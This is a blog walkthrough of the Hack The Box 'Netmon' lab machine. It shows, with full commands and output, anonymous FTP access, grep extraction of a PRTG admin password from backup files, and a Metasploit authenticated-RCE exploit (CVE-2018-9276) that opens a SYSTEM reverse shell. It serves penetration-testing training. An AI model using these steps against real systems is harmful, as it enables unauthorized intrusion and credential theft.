<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Netmon - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,netmon,windows-target,easy-box,user-own,system-own,retired,network,vulnerability-assessment,protocols,outdated-software,ftp,reconnaissance,remote-code-execution,weak-authentication,anonymous-access,guest-access,metasploit-framework"><meta name=description content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Netmon machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/netmon/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Netmon - Walkthrough"><meta property="og:description" content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Netmon machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/netmon/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-06-01T15:00:00+00:00"><meta property="article:modified_time" content="2023-06-01T15:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Netmon - Walkthrough"><meta name=twitter:description content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Netmon machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Netmon - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/netmon/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Netmon - Walkthrough","name":"HTB - Netmon - Walkthrough","description":"SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.\nThe aim of this walkthrough is to provide help with the Netmon machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.","keywords":["htb","walkthrough","netmon","windows-target","easy-box","user-own","system-own","retired","network","vulnerability-assessment","protocols","outdated-software","ftp","reconnaissance","remote-code-execution","weak-authentication","anonymous-access","guest-access","metasploit-framework"],"articleBody":"SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.\nThe aim of this walkthrough is to provide help with the Netmon machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out with finishing the Beginner-Track challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ Finally, a very simple and basic file structure used throughout this writeup for this particular pentest:\n1_recon –\u003e information gathering, enumeration and scanning, active/passive recon 2_exploitation –\u003e exploits, foothold, lateral movement 3_post-exploitation –\u003e privilege-escalation, lateral movement, persistence Generating it is can be done by the following one-liner:\nmkdir 1_recon; mkdir 2_exploitation; mkdir 3_post-exploitation INFORMATION-GATHERING We start out by a quick connection check\n# shell command ping -c 4 -n -R $rhost \u003e connection-test.txt # command line interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon] └──╼ [★]$ ping -c 4 -n -R $rhost \u003e connection-test.txt ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon] └──╼ [★]$ cat connection-test.txt PING 10.129.96.142 (10.129.96.142) 56(124) bytes of data. 64 bytes from 10.129.96.142: icmp_seq=1 ttl=127 time=12.0 ms 64 bytes from 10.129.96.142: icmp_seq=2 ttl=127 time=11.5 ms 64 bytes from 10.129.96.142: icmp_seq=3 ttl=127 time=12.1 ms 64 bytes from 10.129.96.142: icmp_seq=4 ttl=127 time=11.9 ms --- 10.129.96.142 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3004ms rtt min/avg/max/mdev = 11.544/11.853/12.056/0.191 ms ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon] └──╼ [★]$ followed by the usual (service, script, top-ports) tcp scan.\n# shell command nmap -sV -sC -oN nmap-service-script-topports-scan $rhost # command line interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon] └──╼ [★]$ nmap -sV -sC -oN nmap-service-script-topports-scan $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 21:22 BST Nmap scan report for 10.129.96.142 Host is up (0.075s latency). Not shown: 995 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM inetpub | 07-16-16 09:18AM PerfLogs | 02-25-19 10:56PM Program Files | 02-03-19 12:28AM Program Files (x86) | 02-03-19 08:08AM Users |_02-25-19 11:49PM Windows 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm |_http-server-header: PRTG/18.1.37.13946 |_http-trane-info: Problem with XML parsing of /evox/about 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-01T20:22:43 |_ start_date: 2023-06-01T20:15:10 | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.72 seconds ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon] └──╼ [★]$ There are a couple of things to take away from this report:\nftp – anonymous login is allowed target is running a Paessler PRTG bandwidth monitoring tool vulnerable webserver –\u003e (Indy httpd 18.1.37.13946) – possible directory traversal, XSS, SQL injection port 135, 139, 445 –\u003e Microsoft protocols to enable communication between different computers mostly on the same network, but not exclusively os –\u003e probably Windows Server 2008 R2 - 2012 disabled smb signing –\u003e potential MITM attack Firing up our browser and heading over to the our target’s webserver, we are welcomed with a NETMON login page.\nSadly, none of the default credentials we tried worked, not even - prtgadmin:prtgadmin -, so we move on. Let’s check out the ftp share by using anonymous access.\n# shell command ftp $rhost 21 # command line interaction ─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon] └──╼ [★]$ ftp $rhost 21 Connected to 10.129.96.142. 220 Microsoft FTP Service Name (10.129.96.142:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. It looks like the whole primary drive was shared.\n# ftp command ls -al # command line interaction ftp\u003e ls -al 200 PORT command successful. 125 Data connection already open; Transfer starting. 11-20-16 10:46PM $RECYCLE.BIN 02-03-19 12:18AM 1024 .rnd 11-20-16 09:59PM 389408 bootmgr 07-16-16 09:10AM 1 BOOTNXT 02-03-19 08:05AM Documents and Settings 02-25-19 10:15PM inetpub 06-01-23 04:15PM 738197504 pagefile.sys 07-16-16 09:18AM PerfLogs 02-25-19 10:56PM Program Files 02-03-19 12:28AM Program Files (x86) 12-15-21 10:40AM ProgramData 02-03-19 08:05AM Recovery 02-03-19 08:04AM System Volume Information 02-03-19 08:08AM Users 02-25-19 11:49PM Windows 226 Transfer complete. ftp\u003e After goofing around a bit, we come up empty handed and we are forced to resort to looking up the default directory for the NETMON configuration files. They should be at - C:\\ProgramData\\Paessler\\PRTG Network Monitor\\data - so let’s head there.\n# shell command # command line interaction ftp\u003e cd programdata 250 CWD command successful. ftp\u003e ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 12-15-21 10:40AM Corefig 02-03-19 12:15AM Licenses 11-20-16 10:36PM Microsoft 02-03-19 12:18AM Paessler 02-03-19 08:05AM regid.1991-06.com.microsoft 07-16-16 09:18AM SoftwareDistribution 02-03-19 12:15AM TEMP 11-20-16 10:19PM USOPrivate 11-20-16 10:19PM USOShared 02-25-19 10:56PM VMware 226 Transfer complete. ftp\u003e cd paessler\\ 250 CWD command successful. ftp\u003e ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 06-01-23 04:25PM PRTG Network Monitor 226 Transfer complete. ftp\u003e cd \"PRTG Network Monitor\" 250 CWD command successful. ftp\u003e ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 06-01-23 04:25PM Configuration Auto-Backups 06-01-23 04:25PM Log Database 02-03-19 12:18AM Logs (Debug) 02-03-19 12:18AM Logs (Sensors) 02-03-19 12:18AM Logs (System) 06-01-23 04:25PM Logs (Web Server) 06-01-23 04:25PM Monitoring Database 02-25-19 10:54PM 1189697 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak 06-01-23 04:25PM 1640740 PRTG Graph Data Cache.dat 02-25-19 11:00PM Report PDFs 02-03-19 12:18AM System Information Database 02-03-19 12:40AM Ticket Database 02-03-19 12:18AM ToDo Database 226 Transfer complete. ftp\u003e Even though we did not find any data directory, this location seems promising. Especially the four - PRTG - files. Let’s grab them.\n# ftp command get \"PRTG Configuration.dat\" get \"PRTG Configuration.old\" get \"PRTG Configuration.old.bak\" get \"PRTG Graph Data Cache.dat\" # command line interaction ftp\u003e get \"PRTG Configuration.dat\" local: PRTG Configuration.dat remote: PRTG Configuration.dat 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1189697 bytes received in 0.17 secs (6.5802 MB/s) ftp\u003e get \"PRTG Configuration.old\" local: PRTG Configuration.old remote: PRTG Configuration.old 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1189697 bytes received in 0.16 secs (6.9145 MB/s) ftp\u003e get \"PRTG Configuration.old.bak\" local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1153755 bytes received in 0.20 secs (5.3845 MB/s) ftp\u003e get \"PRTG Graph Data Cache.dat\" local: PRTG Graph Data Cache.dat remote: PRTG Graph Data Cache.dat 200 PORT command successful. 125 Data connection already open; Transfer starting. WARNING! 413 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 1640740 bytes received in 0.64 secs (2.4399 MB/s) ftp\u003e SEARCH-FOR-CREDENTIALS The first results we get after we start looking for some leftover credentials is quite lengthy, and not easily readable.\n# shell command grep -i password * # command line interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ grep -i password * PRTG Configuration.dat: PRTG Configuration.dat: PRTG Configuration.dat: PRTG Configuration.dat: PRTG Configuration.dat: PRTG Configuration.dat: PRTG Configuration.dat: PRTG Configuration.dat: PRTG Configuration.dat: ... ... PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: PRTG Configuration.old.bak: ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ It get’s a bit better after we remove all the white spaces, but it’s still very long.\n# shell command grep -i password * | tr -d \" \" # command line interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ grep -i password * | tr -d \" \" PRTGConfiguration.dat: PRTGConfiguration.dat: PRTGConfiguration.dat: PRTGConfiguration.dat: PRTGConfiguration.dat: PRTGConfiguration.dat: PRTGConfiguration.dat: PRTGConfiguration.dat: PRTGConfiguration.dat: PRTGConfiguration.dat: PRTGConfiguration.dat: PRTGConfiguration.dat: PRTGConfiguration.dat: ... ... PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: PRTGConfiguration.old.bak: ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ These all look like some opening and closing tags, and in that case, the passwords we are looking for should be between those tags.\nTherefore, if we want to see those too, we need to use grep’s context line control options. But even with those, the output is still way to long, therefore we use grep, sort and tr to shorten it.\n# shell command grep -i -A 3 -B 3 password * | tr -d \" \" | sort | grep -v '^.*[^\u003c]*\u003c[^\u003e]*\u003e$' | grep -vE '^--$' # command line interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ grep -i -A 3 -B 3 password * | tr -d \" \" | sort | grep -v '^.*[^\u003c]*\u003c[^\u003e]*\u003e$' | grep -vE '^--$' PRTGConfiguration.dat-0 PRTGConfiguration.dat-0 PRTGConfiguration.dat-0 ... ... PRTGConfiguration.dat-0 PRTGConfiguration.dat-0 PRTGConfiguration.dat-1 PRTGConfiguration.dat-1 PRTGConfiguration.dat-1 ... ... PRTGConfiguration.dat-1 PRTGConfiguration.dat-1 PRTGConfiguration.dat-100 PRTGConfiguration.dat-60 PRTGConfiguration.dat-8080 PRTGConfiguration.dat-DE PRTGConfiguration.dat-OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW PRTGConfiguration.old-0 PRTGConfiguration.old-0 ... ... PRTGConfiguration.old-0 PRTGConfiguration.old-0 PRTGConfiguration.old-0 PRTGConfiguration.old-1 PRTGConfiguration.old-1 PRTGConfiguration.old-1 ... ... PRTGConfiguration.old-1 PRTGConfiguration.old-1 PRTGConfiguration.old-1 PRTGConfiguration.old-100 PRTGConfiguration.old-60 PRTGConfiguration.old-8080 PRTGConfiguration.old.bak-0 PRTGConfiguration.old.bak-0 PRTGConfiguration.old.bak-0 PRTGConfiguration.old.bak-0 ... ... PRTGConfiguration.old.bak-0 PRTGConfiguration.old.bak-0 PRTGConfiguration.old.bak-1 PRTGConfiguration.old.bak-1 PRTGConfiguration.old.bak-1 ... ... PRTGConfiguration.old.bak-1 PRTGConfiguration.old.bak-1 PRTGConfiguration.old.bak-1 PRTGConfiguration.old.bak-100 PRTGConfiguration.old.bak-60 PRTGConfiguration.old.bak-8080 PRTGConfiguration.old.bak-DE PRTGConfiguration.old.bak-M24VKFRECBEGN3ZQNGSET723GFIPVHYX PRTGConfiguration.old.bak-\tPrTg@dmin2018 PRTGConfiguration.old-DE PRTGConfiguration.old-OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ There is only one potential password remaining: - PrTg@dmin2018 - in the - PRTGConfiguration.old.bak - file. But we still need to find the matching usename for it.\n# shell command grep PrTg@dmin2018 PRTG\\ Configuration.old.bak -A 3 -B 3 # command line interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ grep PrTg@dmin2018 PRTG\\ Configuration.old.bak -A 3 -B 3 PrTg@dmin2018 60 ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ Great, now let’s try this pair - prtgadmin:PrTg@dmin2018 - agains the webserver’s login page. Sadly, it does not work. How about for ftp?\n┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ ftp $rhost 21 Connected to 10.129.96.142. 220 Microsoft FTP Service Name (10.129.96.142:root): prtgadmin 331 Password required Password: 530 User cannot log in. Login failed. Remote system type is Windows_NT. ftp\u003e exit 221 Goodbye. ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ So neither webserver login, nor ftp login… SMB maybe?\n# shell command smbmap -u prtgadmin -p PrTg@dmin2018 -H $rhost # command line interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ smbmap -u prtgadmin -p PrTg@dmin2018 -H $rhost [!] Authentication error on 10.129.96.142 ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ It looks like we are stuck, so we go and get some help. One of the hints we find mentions taking a deeper look at the PRTG files and their creation date.\n# ftp output from before 02-25-19 10:54PM 1189697 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak 06-01-23 04:25PM 1640740 PRTG Graph Data Cache.dat Looking over the dates, we get the idea… so let’s try - prtgadmin:PrTg@dmin2019 - this time. It works on the website and we are welcomed as a system administrator.\nAfter some research on the aforementioned version, we come up with the following vulnerability: - exploit/windows/http/prtg_authenticated_rce -.\nEXPLOITATION Given the exploit already at hand, we check it out.\n# shell command use exploit/windows/http/prtg_authenticated_rce # command line interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-vemiwsocpu]─[~/netmon/1_recon/findings] └──╼ [★]$ msfconsole -q [msf](Jobs:0 Agents:0) \u003e\u003e use exploit/windows/http/prtg_authenticated_rce [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) \u003e\u003e info Name: PRTG Network Monitor Authenticated RCE Module: exploit/windows/http/prtg_authenticated_rce Platform: Windows Arch: x86, x64 Privileged: No License: Metasploit Framework License (BSD) Rank: Excellent Disclosed: 2018-06-25 Provided by: Josh Berry Julien Bedel Available targets: Id Name -- ---- =\u003e 0 Automatic Targeting Check supported: Yes Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- ADMIN_PASSWORD prtgadmin yes The password for the specified username ADMIN_USERNAME prtgadmin yes The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:ho st:port][...] RHOSTS yes The target host(s), see https://docs.metasploit .com/docs/using-metasploit/basics/using-metaspl oit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections VHOST no HTTP server virtual host Payload information: Description: Notifications can be created by an authenticated user and can execute scripts when triggered. Due to a poorly validated input on the script name, it is possible to chain it with a user-supplied command allowing command execution under the context of privileged user. The module uses provided credentials to log in to the web interface, then creates and triggers a malicious notification to perform RCE using a Powershell payload. It may require a few tries to get a shell because notifications are queued up on the server. This vulnerability affects versions prior to 18.2.39. See references for more details about the vulnerability allowing RCE. References: https://nvd.nist.gov/vuln/detail/CVE-2018-9276 https://www.codewatch.org/blog/?p=453 View the full module info with the info -d command. [msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) \u003e\u003e It’s exactly what we have been looking for. Let’s set the the required options.\n# shell command options # command line interaction [msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) \u003e\u003e options Module options (exploit/windows/http/prtg_authenticated_rce): Name Current Setting Required Description ---- --------------- -------- ----------- ADMIN_PASSWORD prtgadmin yes The password for the specified username ADMIN_USERNAME prtgadmin yes The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:h ost:port][...] RHOSTS yes The target host(s), see https://docs.metasploi t.com/docs/using-metasploit/basics/using-metas ploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections VHOST no HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 206.189.18.70 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Targeting View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) \u003e\u003e set admin_password PrTg@dmin2019 admin_password =\u003e PrTg@dmin2019 [msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) \u003e\u003e set rhosts 10.129.96.142 rhosts =\u003e 10.129.96.142 [msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) \u003e\u003e set lhost tun0 lhost =\u003e 10.10.14.11 Once everything is properly set up, we use check to verify the vulnerability of our target.\n[msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) \u003e\u003e check [*] 10.129.96.142:80 - The target appears to be vulnerable. [msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) \u003e\u003e Looks promising, let’s run the exploit.\n[msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) \u003e\u003e run [*] Started reverse TCP handler on 10.10.14.11:4444 [+] Successfully logged in with provided credentials [+] Created malicious notification (objid=2019) [+] Triggered malicious notification [+] Deleted malicious notification [*] Waiting for payload execution.. (30 sec. max) [*] Sending stage (175686 bytes) to 10.129.96.142 [*] Meterpreter session 2 opened (10.10.14.11:4444 -\u003e 10.129.96.142:51167) at 2023-06-01 23:35:03 +0100 (Meterpreter 2)(C:\\Windows\\system32) \u003e getuid Server username: NT AUTHORITY\\SYSTEM (Meterpreter 2)(C:\\Windows\\system32) \u003e POST-EXPLOITATION Wow, not only do we have a direct shell connection to our target, but it comes with the highest privileges possible. Hence no lateral movement or privilege escalation is needed for this box. All that’s left for us to do now is to simply grab our flags and submit their values.\n(Meterpreter 2)(C:\\Windows\\system32) \u003e cd .. (Meterpreter 2)(C:\\Windows) \u003e cd .. (Meterpreter 2)(C:\\) \u003e cd Users\\\\ cd Users\\\\Administrator\\\\ cd Users\\\\Default\\ User\\\\ cd Users\\\\Public\\\\ cd Users\\\\All\\ Users\\\\ cd Users\\\\Default\\\\ (Meterpreter 2)(C:\\) \u003e cd Users\\\\Public\\\\ (Meterpreter 2)(C:\\Users\\Public) \u003e ls Listing: C:\\Users\\Public ======================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 040555/r-xr-xr-x 0 dir 2019-02-03 12:08:38 +0000 AccountPictures 040555/r-xr-xr-x 4096 dir 2019-02-03 04:18:02 +0000 Desktop 040555/r-xr-xr-x 4096 dir 2019-02-03 12:05:38 +0000 Documents 040555/r-xr-xr-x 0 dir 2016-07-16 14:18:05 +0100 Downloads 040555/r-xr-xr-x 0 dir 2016-07-16 14:18:05 +0100 Libraries 040555/r-xr-xr-x 0 dir 2016-07-16 14:18:05 +0100 Music 040555/r-xr-xr-x 0 dir 2016-07-16 14:18:05 +0100 Pictures 040555/r-xr-xr-x 0 dir 2016-07-16 14:18:05 +0100 Videos 100666/rw-rw-rw- 174 fil 2016-07-16 14:16:27 +0100 desktop.ini 100444/r--r--r-- 34 fil 2023-06-01 21:15:43 +0100 user.txt (Meterpreter 2)(C:\\Users\\Public) \u003e cat user.txt (Meterpreter 2)(C:\\Users\\Public) \u003e cd ..\\\\Administrator\\\\ cd ..\\\\Administrator\\\\AppData\\\\ cd ..\\\\Administrator\\\\My\\ Documents\\\\ cd ..\\\\Administrator\\\\Application\\ Data\\\\ cd ..\\\\Administrator\\\\NetHood\\\\ cd ..\\\\Administrator\\\\Contacts\\\\ cd ..\\\\Administrator\\\\Pictures\\\\ cd ..\\\\Administrator\\\\Cookies\\\\ cd ..\\\\Administrator\\\\PrintHood\\\\ cd ..\\\\Administrator\\\\Desktop\\\\ cd ..\\\\Administrator\\\\Recent\\\\ cd ..\\\\Administrator\\\\Documents\\\\ cd ..\\\\Administrator\\\\Saved\\ Games\\\\ cd ..\\\\Administrator\\\\Downloads\\\\ cd ..\\\\Administrator\\\\Searches\\\\ cd ..\\\\Administrator\\\\Favorites\\\\ cd ..\\\\Administrator\\\\SendTo\\\\ cd ..\\\\Administrator\\\\Links\\\\ cd ..\\\\Administrator\\\\Start\\ Menu\\\\ cd ..\\\\Administrator\\\\Local\\ Settings\\\\ cd ..\\\\Administrator\\\\Templates\\\\ cd ..\\\\Administrator\\\\Music\\\\ cd ..\\\\Administrator\\\\Videos\\\\ (Meterpreter 2)(C:\\Users\\Public) \u003e cd ..\\\\Administrator\\\\Desktop\\\\ (Meterpreter 2)(C:\\Users\\Administrator\\Desktop) \u003e ls Listing: C:\\Users\\Administrator\\Desktop ======================================= Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 282 fil 2019-02-03 12:08:39 +0000 desktop.ini 100444/r--r--r-- 34 fil 2023-06-01 21:15:43 +0100 root.txt (Meterpreter 2)(C:\\Users\\Administrator\\Desktop) \u003e cat root.txt (Meterpreter 2)(C:\\Users\\Administrator\\Desktop) \u003e Congratulations, we just successfully pwned the target machine. All that’s left for us now is to simply terminate the target box (if not terminated already) before continuing with the next 